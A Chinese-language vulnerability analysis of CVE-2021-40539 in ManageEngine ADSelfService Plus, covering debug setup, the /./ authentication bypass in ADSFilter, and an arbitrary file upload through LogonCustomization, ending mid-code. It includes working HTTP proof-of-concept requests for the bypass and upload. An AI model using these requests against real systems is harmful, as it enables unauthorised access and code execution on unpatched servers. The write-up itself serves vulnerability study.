## 概述
ZOHO ManageEngine ADSelfService Plus是美国卓豪（ZOHO）公司的针对 Active Directory
和云应用程序的集成式自助密码管理和单点登录解决方案。
CVE-2021-40539是一个身份认证绕过漏洞，可能导致任意远程代码执行 (RCE)。
根据[官方信息](https://www.manageengine.com/products/self-service-password/release-notes.html),在2021年11月7日的6114版本中得到修复。
据CISA， **CVE-2021-40539** 已在野漏洞利用中被检测到，黑客可以利用此漏洞来控制受影响的系统。
作为JAVA安全研究菜鸟，本篇文章的思路是按照已知这个漏洞存在，并且知道poc的前提下，进行漏洞的复现以及原理的分析。在复现过程中发现与其它大佬分析的一些不同处，简单记录，一方面供新手参考；另一方面继续积累java漏洞模式理解，为后续开展漏洞挖掘做准备工作。
## 环境搭建
### 软件环境
官网只提供最新版下载，在[下载网站](https://fs2.download82.com/software/bbd8ff9dba17080c0c121804efbd61d5/manageengine-adselfservice-plus/ManageEngine_ADSelfService_Plus_64bit.exe)可以下载到5.8版本
安装过程中有个坑，图形化界面安装到最后阶段后会卡在一个界面过不去，参考其他大佬的一些做法，我重启了自己的机器，然后运行安装目录下的C:\ManageEngine\ADSelfService
Plus\bin\run.bat,即可开始文字界面的安装选择，然后就可以根据默认的8888端口(http)，或者9251端口(https)打开web界面
### 调试环境配置
将C:\ManageEngine\ADSelfService Plus复制到我的Mac环境下，使用idea打开
在目标bin/run.bat中添加一行（这行命令直接去idea里面复制即可）
    set JAVA_OPTS=%JAVA_OPTS% -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
然后停止服务，再双击run.bat重新以调试模式启动
在idea中设置相关调试设置
我们的调试环境就配置完成了
要怎么检验是否成功配置好了呢，可以查看C:\ManageEngine\ADSelfService Plus\webapps\adssp\WEB-INF\web.xml文件，可以看到以下内容
            AssociateCredential
            com.adventnet.authentication.filter.AssociateCredential
            AssociateCredential
            /*
可知，任意url模式下，都会触发AssociateCredential这个filter，因此，尝试在这个filter的doFilter函数下断点，随便访问一个页面，如果能断下来，则证明调试环境配置成功
尝试随便请求一个页面
## 漏洞分析
### 认证绕过漏洞
认证绕过漏洞的一个例子是
    POST /./RestAPI/LogonCustomization HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 27
    methodToCall=previewMobLogo
默认请求
但加上/./则可绕过认证
尝试分析一下这个流程，java应用中的web.xml是用来初始化配置信息,Welcome页面、servlet、servlet-mapping、filter、listener、启动加载级别等都可以在web.xml中定义
根据/./RestAPI/LogonCustomization这个url可以看到以下内容
            action
            org.apache.struts.action.ActionServlet
                config
                /WEB-INF/struts-config.xml, /WEB-INF/accounts-struts-config.xml, /adsf/struts-config.xml, /WEB-INF/api-struts-config.xml, /WEB-INF/mobile/struts-config.xml
                validate
                true
                chainConfig
                org/apache/struts/tiles/chain-config.xml
            1
        action
        /RestAPI/*
证明请求/./RestAPI/LogonCustomization时候首先会调用到org.apache.struts.action.ActionServlet内容
因此直接尝试在其中doPost函数中下个断点
在下断点后，尝试发送正常的不带/./的请求
    POST /RestAPI/LogonCustomization HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 27
    methodToCall=previewMobLogo
发现并不会触发断点
但是尝试请求
    POST /./RestAPI/LogonCustomization HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 27
    methodToCall=previewMobLogo
发现可以触发断点
以上测试可以证明的是，认证校验代码并不存在org.apache.struts.action.ActionServlet以及之后的数据处理中，而应该在到org.apache.struts.action.ActionServlet之前的处理中，显然，应该是在filter中，尝试去看看这个url都会触发什么filter
根据web.xml，/RestAPI/LogonCustomization会按顺序触发以下filter
    AssociateCredential
    EncodingFilter
    METrackFilter
    ADSFilter
当然如果尝试在ActionServlet中下断点，看一下触发流程也可以知道有哪些filter
尝试在这几个filter的doFilter函数中都下断点
另外保留org.apache.struts.action.ActionServlet中的断点
在我们尝试发送认证绕过的数据包时候，这些filter以及ActionServlet均会触发
但是在尝试发送不带/./的普通数据包的时候，发现四个filter也都会被触发，但是却触发不了ActionServlet
两种情况相对比即可证明，针对restAPI的校验的逻辑应该是存在于最后的filter——ADSFilter中，因此，将认证绕过漏洞我们的分析重点放在ADSFilter对象中
要通过这个filter的检查，意味着不能return，要运行到最后filterChain.doFilter(request, response)这一行才可以
通过动态跟踪，发现使用不带绕过的url——/RestAPI/LogonCustomization时候，会在以下这一行return
    restApiUrlPattern = this.filterParams.has("API_URL_PATTERN") ? this.filterParams.getString("API_URL_PATTERN") : "/RestAPI/.*";
    if (Pattern.matches(restApiUrlPattern, reqURI) && !RestAPIFilter.doAction(servletRequest, servletResponse, this.filterParams, this.filterConfig)) {
        return;
    }
证明这里的检查没有通过，另一方面也证明我们使用/./RestAPI/LogonCustomization绕过的正是此处认证，尝试分析一下检查逻辑
在这段代码前边是以下逻辑，检查requrl是否匹配`.*.do|.*.cc|/webclient/index.html`模式，如果匹配则进行相应的认证凭证校验
我们请求的/RestAPI/*不符合以上模式，因此会继续向下运行
其中`Pattern.matches(restApiUrlPattern,
reqURI)`中`reqURI`是我们请求的url，分析前边代码可知`restApiUrlPattern`的值为/RestAPI/.*，因此当我们请求的url为/./RestAPI/LogonCustomization很容易绕过这句判断，因为后边又紧跟着&&，因此只要这个判断不通过就不会return，绕过认证
### 任意文件上传漏洞
poc如下：
    POST /./RestAPI/LogonCustomization HTTP/1.1
    Host: 192.168.1.106:9251
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: Content-Type: application/x-www-form-urlencoded
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=---------------------------39411536912265220004317003537
    Te: trailers
    Connection: close
    Content-Length: 1212
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="methodToCall"
    unspecified
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="Save"
    yes
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="form"
    smartcard
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="operation"
    Add
    -----------------------------39411536912265220004317003537
    Content-Disposition: form-data; name="CERTIFICATE_PATH"; filename="test.txt"
    Content-Type: application/octet-stream
    arbitrary content
    -----------------------------39411536912265220004317003537--    
尝试发包
结果会在bin目录下创建test.txt这个文件，内容为arbitrary content
尝试分析逻辑
还是先看web.xml，
    .....
            action
            org.apache.struts.action.ActionServlet
    .....
        action
        /RestAPI/*
    .....
显然这里使用了structs，想要找到具体的逻辑，我们去参考web.xml同目录下的struts-config.xml文件，搜索LogonCustomization
因为poc中methodToCall的值是unspecified，初步确定相关逻辑在LogonCustomization中的unspecified函数中
    public ActionForward unspecified(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {
            AdventNetResourceBundle rb = ResourceBundleMgr.getInstance().getBundle(request);
            String message = "";
            String messageType = "";
            try {
                DynaActionForm dynForm = (DynaActionForm)form;
                Long loginId = (Long)request.getSession().getAttribute("ADMP_SESSION_LOGIN_ID");
                ArrayList logonList = DomainUtil.getDomainShowStatus();
                ArrayList loginAttrList = DomainUtil.getLoginAttrPropList();
                request.setAttribute("forwardTo", "LogonSettings");
                int j;
                Properties p;
                String domainName;
                String formDomainStatus;
                String loginAttrEnableStatus;
                String operation;
                String formValue;
                String ldapName;
                if (request.getParameter("Save") != null) {
                    message = rb.getString("adssp.common.text.success_update");
                    messageType = "success";
                    if ("mob".equalsIgnoreCase(request.getParameter("form"))) {
                        this.saveMobileSettings(logonList, request);
                        request.setAttribute("form", "mob");
                    } else if ("smartcard".equalsIgnoreCase(request.getParameter("form"))) {
                        operation = request.getParameter("operation");
                        SmartCardAction sCAction = new SmartCardAction();
                        if (operation.equalsIgnoreCase("Add")) {
                            request.setAttribute("CERTIFICATE_FILE", ClientUtil.getFileFromRequest(request, "CERTIFICATE_PATH"));
                            request.setAttribute("CERTIFICATE_NAME", ClientUtil.getUploadedFileName(request, "CERTIFICATE_PATH"));
                            sCAction.addSmartCardConfig(mapping, dynForm, request, response);
                        } else if (operation.equalsIgnoreCase("Update")) {
                            sCAction.updateSmartCardConfig(mapping, form, request, response);
                        }
                        if (request.getAttribute("SMART_CARD_DETAILS") != null) {
                            JSONObject status = (JSONObject)request.getAttribute("SMART_CARD_DETAILS");
                            if (status.has("eSTATUS")) {
                                messageType = "error";
                                message = rb.getString((String)status.get("eSTATUS"));
                            } else {
                                messageType = "success";
                                message = rb.getString((String)status.get("sSTATUS"));
                            }
                        }
                    } else {
                        for(j = 0; j < formElements.length; ++j) {
                            formValue = (String)dynForm.get(formElements[j]);
                            if (formValue != null && j != 1) {
                                ADSMPersUtil.updateSyMParameter(dbElements[j], formValue);
                            }
                        }
                        int j;
                        if (dynForm.get("SHOW_CAPTCHA_LOGIN_PAGE").toString().equals("true") || dynForm.get("SHOW_CAPTCHA_RUL_PAGE").toString().equals("true")) {
                            if ((Boolean)dynForm.get("CUSTOM_CAPTCHA")) {
                                j = Integer.parseInt(dynForm.get("MAX_INVALID_LOGIN").toString());
                                j = Integer.parseInt(dynForm.get("RESET_TIME").toString());
                                CaptchaUtil.updateLogonCaptchaSettings(true, j, j);
                            } else {
                                CaptchaUtil.updateLogonCaptchaSettings(false, 0, 0);
                            }
                        }
                        if ("true".equalsIgnoreCase((String)dynForm.get("showDomainBox"))) {
                            for(j = 0; j < logonList.size(); ++j) {
                                p = (Properties)logonList.get(j);
                                domainName = (String)p.get("DOMAIN_NAME");
                                int formStatus = 0;
                                formDomainStatus = request.getParameter(domainName + "_CHK");
                                if ("true".equalsIgnoreCase(formDomainStatus)) {
                                    formStatus = 1;
                                }
                                DomainUtil.addUpdateLogonDomains(domainName, new String[]{"DISPLAY_STATUS"}, new int[]{formStatus});
                            }
                        }
                        ArrayList finalList = new ArrayList();
                        for(j = 0; j < loginAttrList.size(); ++j) {
                            Properties p = (Properties)loginAttrList.get(j);
                            ldapName = (String)p.get("LDAP_NAME");
                            Boolean enableStatus = (Boolean)p.get("ENABLE_STATUS");
                            loginAttrEnableStatus = request.getParameter(ldapName + "_LCHK");
                            if ("true".equalsIgnoreCase(loginAttrEnableStatus)) {
                                enableStatus = true;
                            } else {
                                enableStatus = false;
                            }
                            Properties savedProp = new Properties();
                            savedProp.put("LDAP_NAME", ldapName);
                            savedProp.put("ENABLE_STATUS", enableStatus);
                            finalList.add(savedProp);
                        }
                        DomainUtil.setLoginAttributeList(finalList);
                        Hashtable props = new Hashtable();
                        domainName = request.getParameter("ACCESS_CONTROL");
                        props.put("ACCESS_CONTROL", domainName == null ? "" : domainName);
                        UserUtil.setUserPersonal(loginId, props);